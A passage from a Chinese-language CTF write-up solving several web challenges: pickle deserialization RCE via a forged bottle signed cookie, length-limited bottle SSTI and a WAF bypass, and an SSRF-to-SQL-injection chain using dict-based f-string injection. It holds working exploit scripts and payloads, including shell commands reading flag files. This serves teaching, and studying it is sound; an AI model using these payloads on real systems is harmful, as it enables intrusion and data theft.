class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">self, key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span><br><span class="hljs-string">        `secret` must match the one used to create the cookie (see</span><br><span class="hljs-string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span><br><span class="hljs-string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span><br>    value = <span class="hljs-variable language_">self</span>.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret:<br>        <span class="hljs-comment"># See BaseResponse.set_cookie for details on signed cookies.</span><br>        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value.startswith(<span class="hljs-string">&#x27;!&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">in</span> value:<br>            sig, msg = <span class="hljs-built_in">map</span>(tob, value[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()<br>            <span class="hljs-keyword">if</span> _lscmp(sig, base64.b64encode(<span class="hljs-built_in">hash</span>)):<br>                dst = pickle.loads(base64.b64decode(msg))<br>                <span class="hljs-keyword">if</span> dst <span class="hljs-keyword">and</span> dst[<span class="hljs-number">0</span>] == key:<br>                    <span class="hljs-keyword">return</span> dst[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br></code></pre></td></tr></table></figure><p>可以看到只要签名对的上就能直接进pickle的反序列化。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os, hmac, hashlib, base64, pickle, requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tob</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s.encode(enc)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span> <span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytes</span>(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touni</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span>, err=<span class="hljs-string">&#x27;strict&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s.decode(enc, err)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_cookie</span>(<span class="hljs-params">name, value, secret</span>):<br>    d = pickle.dumps([name, value], -<span class="hljs-number">1</span>)<br>    encoded = base64.b64encode(d)<br>    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.sha256).digest())<br>    value = touni(tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + encoded)<br>    <span class="hljs-keyword">return</span> value<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PickleRCE</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">from bottle import response</span><br><span class="hljs-string">import subprocess,base64</span><br><span class="hljs-string">output = subprocess.check_output(&#x27;cat /flag_dda2d465-af33-4c56-8cc9-fd4306867b70&#x27;, shell=True)</span><br><span class="hljs-string">response.set_header(&#x27;X-Flag&#x27;,base64.b64encode(output))</span><br><span class="hljs-string">&quot;&quot;&quot;</span>,))<br><br>session = &#123;<span class="hljs-string">&quot;name&quot;</span>: PickleRCE()&#125;<br>cookie = create_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>)<br><br>r = requests.get(<span class="hljs-string">&quot;http:&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;name&quot;</span>: cookie&#125;)<br><span class="hljs-built_in">print</span>(base64.b64decode(r.headers[<span class="hljs-string">&quot;x-flag&quot;</span>]).decode(<span class="hljs-string">&quot;ascii&quot;</span>))<br></code></pre></td></tr></table></figure><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>不要使用反序列化的方式来读取session，避免危害，使用一些简单的像json这样来读取，内部鉴权😊🤓</p><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><p>像是VN的那到<code>SSTI</code>，但是限制了长度，还限制的很死，呜呜呜</p><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>常规思路的ssti打法完全不行，限制的太死了🤓🤓🤓🤓</p><p>看到官方wp解释使用，其实bottle的SSTI可以直接访问到内部类。所以易得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span><br><br><br>payload = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><br><br>p = [payload[i:i+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),<span class="hljs-number">3</span>)]<br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:tmp&#125;)<br><br>r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p>直接往os里塞字符。随后一起拿出来exec。这样子就可以实现SSTI。</p><h3 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h3><p>遇到这种新的ssti的题目，不能仅仅局限到原始的<code>ssti</code>链子，要去翻一下框架的源码，去了解一下新的思路</p><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><p>在<code>出题人已疯</code>的基础上禁止了更多的字符。这下没法用之前的方法做了</p><p>看了**<code>LamentXU</code>**的新思路，我靠，太屌了😭😭😭😭</p><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> <br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p><strong>bottle可以通过斜体字进行waf的bypass</strong>   参考：<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">BApen</span>(%<span class="hljs-name">27/flag</span>%<span class="hljs-number">27</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="思考-2"><a href="#思考-2" class="headerlink" title="思考"></a>思考</h3><p>没有思考，自己是废物<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414215559182.png" alt="image-20250414215559182"></p><h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>la佬说是”签到”🤡🤡🤡</p><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> target_url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br><br></code></pre></td></tr></table></figure><p>json反序列化&amp;python格式化字符串漏洞</p><h3 id="python格式化字符串漏洞"><a href="#python格式化字符串漏洞" class="headerlink" title="python格式化字符串漏洞"></a>python格式化字符串漏洞</h3><p>在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。</p><p>如下：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414215930925.png" alt="image-20250414215930925"></p><p>因此，这题可以这样解：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-selector-tag">code</span>&quot;:[<span class="hljs-string">&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>传入的code为列表，因而可以通过waf（len为2，没有<code>&#39;</code>元素）随后直接被f-string强转，拼入sql语句，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> country <span class="hljs-keyword">WHERE</span> code<span class="hljs-operator">=</span><span class="hljs-built_in">UPPER</span>(<span class="hljs-string">&#x27;[&quot;1&#x27;</span>) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> FLAG <span class="hljs-keyword">FROM</span> FLAG <span class="hljs-comment">--&quot;,&quot;1&quot;]&#x27;)</span><br></code></pre></td></tr></table></figure><p>参考了TCP1PCTF的Hacked题目：<a href="https://www.cnblogs.com/LAMENTXU/articles/18461268">https://www.cnblogs.com/LAMENTXU/articles/18461268</a></p><p>通过<code>init_db.py</code>我们可以知道。flag在LamentXU对应的值里。但是LamentXU的长度&gt;6，因此不能直接查询。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Fate = [<br>    (<span class="hljs-string">&#x27;JOHN&#x27;</span>, <span class="hljs-string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),<br>    (<span class="hljs-string">&#x27;JANE&#x27;</span>, <span class="hljs-string">&#x27;1990-2025 Lost in a fire&#x27;</span>),<br>    (<span class="hljs-string">&#x27;SARAH&#x27;</span>, <span class="hljs-string">&#x27;1982-2017 Fired by a government official&#x27;</span>),<br>    (<span class="hljs-string">&#x27;DANIEL&#x27;</span>, <span class="hljs-string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),<br>    (<span class="hljs-string">&#x27;LUKE&#x27;</span>, <span class="hljs-string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),<br>    (<span class="hljs-string">&#x27;KAREN&#x27;</span>, <span class="hljs-string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),<br>    (<span class="hljs-string">&#x27;BRIAN&#x27;</span>, <span class="hljs-string">&#x27;1966-2002 Drowned in a river&#x27;</span>),<br>    (<span class="hljs-string">&#x27;ANNA&#x27;</span>, <span class="hljs-string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),<br>    (<span class="hljs-string">&#x27;JACOB&#x27;</span>, <span class="hljs-string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),<br>    (<span class="hljs-string">&#x27;LAMENTXU&#x27;</span>, <span class="hljs-string">r&#x27;2024 Send you a flag flag&#123;fake&#125;&#x27;</span>)<br>]<br><br></code></pre></td></tr></table></figure><p>也就是在CakeCTF的那道题上套了个SSRF的环节。</p><p>我为了让json这部分更明显甚至去除了<code>flask.request.get_json()</code>而是使用了<code>json.loads()</code>，甚至标了注释。题目到这里应该是变得比较简单了。</p><p>我们一个环节一个环节来。</p><p>首先看SSRF部分。</p><p>1.在前面加入lamentxu.top，这个可以用@来绕过。<br>2.禁止了所有字母和<code>.</code>，那么我们使用2130706433来表示127.0.0.1。(不知道为什么本地测试过不了，我靠🤡🤡)<br>3.必须要传入参数0为abcdef。使用二次URL编码绕过。</p><p>接下来就是SQL注入部分</p><p>使用上文提到的办法即可，但是这里限制了列表和元组，使用字典。</p><p>传入数据为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span 